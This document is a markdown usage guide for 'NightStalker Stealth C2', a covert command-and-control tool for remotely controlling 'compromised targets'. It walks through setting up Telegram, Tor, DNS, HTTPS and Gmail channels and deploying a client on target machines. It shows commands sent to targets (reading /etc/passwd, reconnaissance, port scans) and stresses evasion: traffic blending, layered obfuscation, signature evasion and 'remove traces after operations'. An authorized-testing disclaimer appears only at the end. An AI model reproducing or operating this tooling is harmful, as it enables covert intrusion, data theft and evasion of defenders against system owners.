# NightStalker Stealth C2 Guide

## Overview

The NightStalker Stealth C2 (Command & Control) system provides highly covert communication channels for controlling compromised targets. It supports multiple stealth channels including Telegram bots, Tor hidden services, DNS tunneling, HTTPS servers, and Gmail API.

## 🌟 Key Features

- **Multiple Stealth Channels**: Telegram, Tor, DNS, HTTPS, Gmail
- **Easy Setup**: Interactive setup process for each channel
- **Highly Stealthy**: Traffic blends with legitimate communications
- **Encrypted Communications**: All data encrypted with multiple layers
- **Cross-Platform**: Works on Windows, Linux, and macOS
- **Automatic Target Management**: Register and track multiple targets

## 📡 Supported Channels

### 1. Telegram Bot (Recommended)
- **Stealth Level**: ⭐⭐⭐⭐⭐
- **Setup Difficulty**: ⭐⭐
- **Detection Risk**: Very Low
- **Traffic**: Looks like normal Telegram messages

### 2. Tor Hidden Service
- **Stealth Level**: ⭐⭐⭐⭐⭐
- **Setup Difficulty**: ⭐⭐⭐
- **Detection Risk**: Extremely Low
- **Traffic**: Anonymous Tor network

### 3. DNS C2
- **Stealth Level**: ⭐⭐⭐⭐
- **Setup Difficulty**: ⭐⭐⭐
- **Detection Risk**: Low
- **Traffic**: DNS queries (very common)

### 4. HTTPS Server
- **Stealth Level**: ⭐⭐⭐
- **Setup Difficulty**: ⭐⭐
- **Detection Risk**: Medium
- **Traffic**: HTTPS requests (legitimate)

### 5. Gmail API
- **Stealth Level**: ⭐⭐⭐⭐
- **Setup Difficulty**: ⭐⭐⭐
- **Detection Risk**: Low
- **Traffic**: Email communications

## 🚀 Quick Start

### Server Setup

```bash
# Start interactive C2 setup
nightstalker c2 deploy

# List active channels and targets
nightstalker c2 list

# Send command to target
nightstalker c2 send --target-id TARGET001 --command "whoami"

# Get command results
nightstalker c2 results --target-id TARGET001
```

### Client Setup

```bash
# Run C2 client on target
python -m nightstalker.c2.stealth_client --target-id TARGET001 --channel telegram --bot-token YOUR_BOT_TOKEN --chat-id YOUR_CHAT_ID
```

## 📱 Telegram Bot Setup

### 1. Create Telegram Bot

1. Message `@BotFather` on Telegram
2. Send `/newbot`
3. Follow instructions to create bot
4. Save the bot token

### 2. Get Chat ID

1. Add your bot to a chat/group
2. Send a message in the chat
3. Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
4. Find the `chat_id` in the response

### 3. Setup C2 Server

```bash
nightstalker c2 deploy
# Select option 1 (Telegram)
# Enter bot token and chat ID
```

### 4. Deploy Client

```bash
python -m nightstalker.c2.stealth_client \
  --target-id TARGET001 \
  --channel telegram \
  --bot-token YOUR_BOT_TOKEN \
  --chat-id YOUR_CHAT_ID
```

## 🌐 Tor Hidden Service Setup

### 1. Install Tor

```bash
# Ubuntu/Debian
sudo apt install tor

# CentOS/RHEL
sudo yum install tor

# macOS
brew install tor
```

### 2. Setup C2 Server

```bash
nightstalker c2 deploy
# Select option 2 (Tor)
# The system will create a hidden service automatically
```

### 3. Deploy Client

```bash
python -m nightstalker.c2.stealth_client \
  --target-id TARGET001 \
  --channel tor \
  --onion-address YOUR_ONION_ADDRESS
```

## 🔍 DNS C2 Setup

### 1. Domain Setup

1. Register a domain (e.g., `c2.example.com`)
2. Configure DNS records
3. Set up DNS server if needed

### 2. Setup C2 Server

```bash
nightstalker c2 deploy
# Select option 3 (DNS)
# Enter domain name and DNS server
```

### 3. Deploy Client

```bash
python -m nightstalker.c2.stealth_client \
  --target-id TARGET001 \
  --channel dns \
  --domain c2.example.com
```

## 🔒 HTTPS Server Setup

### 1. Server Requirements

- Web server (Apache/Nginx)
- SSL certificate
- API endpoint

### 2. Setup C2 Server

```bash
nightstalker c2 deploy
# Select option 4 (HTTPS)
# Enter server URL and API key
```

### 3. Deploy Client

```bash
python -m nightstalker.c2.stealth_client \
  --target-id TARGET001 \
  --channel https \
  --server-url https://your-server.com \
  --api-key YOUR_API_KEY
```

## 📧 Gmail API Setup

### 1. Google Cloud Setup

1. Create Google Cloud project
2. Enable Gmail API
3. Create OAuth 2.0 credentials
4. Download credentials file

### 2. Setup C2 Server

```bash
nightstalker c2 deploy
# Select option 5 (Gmail)
# Enter credentials file path
```

### 3. Deploy Client

```bash
python -m nightstalker.c2.stealth_client \
  --target-id TARGET001 \
  --channel gmail \
  --credentials-file credentials.json
```

## 🎯 Target Management

### Register Targets

Targets automatically register when they connect to the C2 server.

### List Targets

```bash
nightstalker c2 targets
```

### Get Target Details

```bash
nightstalker c2 targets --target-id TARGET001
```

### Send Commands

```bash
# Basic command
nightstalker c2 send --target-id TARGET001 --command "whoami"

# Command with timeout
nightstalker c2 send --target-id TARGET001 --command "ping -c 4 8.8.8.8" --timeout 60

# File operations
nightstalker c2 send --target-id TARGET001 --command "ls -la /etc/passwd"

# System information
nightstalker c2 send --target-id TARGET001 --command "uname -a"
```

### Get Results

```bash
# Get all results for target
nightstalker c2 results --target-id TARGET001

# Get specific command result
nightstalker c2 results --target-id TARGET001 --command-id cmd_1234567890_abc123
```

## 🔐 Security Features

### Encryption

All communications are encrypted using:
- **Layer 1**: Fernet encryption
- **Layer 2**: Random padding
- **Layer 3**: XOR obfuscation
- **Layer 4**: Custom base64 encoding

### Stealth Techniques

- **Traffic Blending**: Communications look like legitimate traffic
- **Jitter**: Random delays between communications
- **Obfuscation**: Multiple layers of data obfuscation
- **Container Hiding**: Data hidden in images or text

### Anti-Detection

- **Signature Evasion**: No standard C2 signatures
- **Behavior Analysis**: Mimics legitimate applications
- **Network Analysis**: Traffic patterns match normal usage
- **Memory Analysis**: Minimal memory footprint

## 📊 Command Examples

### System Reconnaissance

```bash
# System information
nightstalker c2 send --target-id TARGET001 --command "uname -a && cat /etc/os-release"

# Network information
nightstalker c2 send --target-id TARGET001 --command "ip addr show && netstat -tuln"

# User information
nightstalker c2 send --target-id TARGET001 --command "whoami && id && groups"

# Process list
nightstalker c2 send --target-id TARGET001 --command "ps aux"
```

### File Operations

```bash
# List files
nightstalker c2 send --target-id TARGET001 --command "ls -la /home/user"

# Read file
nightstalker c2 send --target-id TARGET001 --command "cat /etc/passwd"

# Find files
nightstalker c2 send --target-id TARGET001 --command "find /home -name '*.txt' -type f"
```

### Network Operations

```bash
# Port scan
nightstalker c2 send --target-id TARGET001 --command "nmap -sT -p 22,80,443 localhost"

# Network connections
nightstalker c2 send --target-id TARGET001 --command "netstat -tuln"

# DNS queries
nightstalker c2 send --target-id TARGET001 --command "nslookup google.com"
```

## 🛠️ Advanced Usage

### Python API

```python
from nightstalker.c2.stealth_c2 import StealthC2

# Initialize C2
c2 = StealthC2()

# Setup channel
c2.setup_channel('telegram', bot_token='YOUR_TOKEN', chat_id='YOUR_CHAT_ID')

# Register target
c2.register_target('TARGET001', {'platform': 'linux', 'user': 'test'})

# Send command
c2.send_command('TARGET001', 'whoami')

# Get results
results = c2.get_results('TARGET001')
```

### Client API

```python
from nightstalker.c2.stealth_client import StealthC2Client

# Create client
client = StealthC2Client(
    target_id='TARGET001',
    channel_type='telegram',
    bot_token='YOUR_TOKEN',
    chat_id='YOUR_CHAT_ID'
)

# Start client
client.start()
```

## 🔧 Configuration

### Server Configuration

```yaml
# config.yaml
c2:
  channels:
    telegram:
      bot_token: YOUR_BOT_TOKEN
      chat_id: YOUR_CHAT_ID
    tor:
      hidden_service_dir: /tmp/tor_hidden_service
    dns:
      domain: c2.example.com
      dns_server: 8.8.8.8
    https:
      server_url: https://your-server.com
      api_key: YOUR_API_KEY
    gmail:
      credentials_file: credentials.json
      user_id: me
  
  security:
    jitter: 0.1
    max_retries: 3
    timeout: 30
    encryption_enabled: true
```

### Client Configuration

```yaml
# client_config.yaml
client:
  target_id: TARGET001
  channel_type: telegram
  channel_config:
    bot_token: YOUR_BOT_TOKEN
    chat_id: YOUR_CHAT_ID
  
  behavior:
    check_interval: 60
    max_retries: 3
    stealth_mode: true
```

## 🚨 Troubleshooting

### Common Issues

1. **Telegram Bot Not Responding**
   - Check bot token and chat ID
   - Ensure bot has permission to send messages
   - Verify internet connectivity

2. **Tor Hidden Service Not Working**
   - Check Tor installation
   - Verify hidden service directory permissions
   - Check firewall settings

3. **DNS C2 Not Working**
   - Verify domain configuration
   - Check DNS server settings
   - Ensure DNS queries are allowed

4. **HTTPS Server Issues**
   - Check SSL certificate
   - Verify API endpoints
   - Check server connectivity

5. **Gmail API Issues**
   - Verify credentials file
   - Check API permissions
   - Ensure OAuth flow completed

### Debug Mode

```bash
# Enable debug logging
export NIGHTSTALKER_DEBUG=1
nightstalker c2 deploy

# Check logs
tail -f logs/nightstalker.log
```

## 📚 Best Practices

### Security

1. **Use Strong Encryption**: Always enable encryption
2. **Rotate Keys**: Regularly change encryption keys
3. **Monitor Traffic**: Watch for unusual patterns
4. **Limit Access**: Restrict who can access C2
5. **Secure Storage**: Protect configuration files

### Stealth

1. **Blend Traffic**: Use channels that look legitimate
2. **Vary Patterns**: Don't use predictable timing
3. **Minimize Footprint**: Keep communications small
4. **Use Jitter**: Add random delays
5. **Obfuscate Data**: Hide data in containers

### Operations

1. **Test Thoroughly**: Test all channels before deployment
2. **Monitor Targets**: Keep track of target status
3. **Backup Data**: Save important results
4. **Clean Up**: Remove traces after operations
5. **Document Everything**: Keep detailed logs

## ⚖️ Legal and Ethical Considerations

**IMPORTANT**: This tool is for authorized security testing only.

- **Authorization Required**: Only test systems you own or have permission to test
- **Educational Purpose**: Use for learning and authorized assessments
- **No Malicious Use**: Do not use for unauthorized access
- **Compliance**: Follow all applicable laws and regulations
- **Responsible Disclosure**: Report vulnerabilities properly

## 📞 Support

- **Documentation**: Check this guide and other docs
- **Examples**: Review example scripts
- **Issues**: Report bugs on GitHub
- **Community**: Join security forums for help

---

**Remember**: Always obtain proper authorization before testing any systems, and follow responsible disclosure practices when reporting vulnerabilities.

**Happy Hacking! 🎯** 